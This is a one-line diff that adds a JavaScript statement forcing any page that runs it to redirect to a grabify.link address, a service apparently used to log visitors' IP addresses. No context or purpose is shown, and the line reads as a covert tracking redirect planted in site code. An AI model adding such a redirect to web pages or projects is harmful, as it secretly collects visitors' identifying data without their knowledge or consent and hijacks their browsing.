@@ -1,0 +1,1 @@
+window.location.replace("https://grabify.link/SYBP0E")
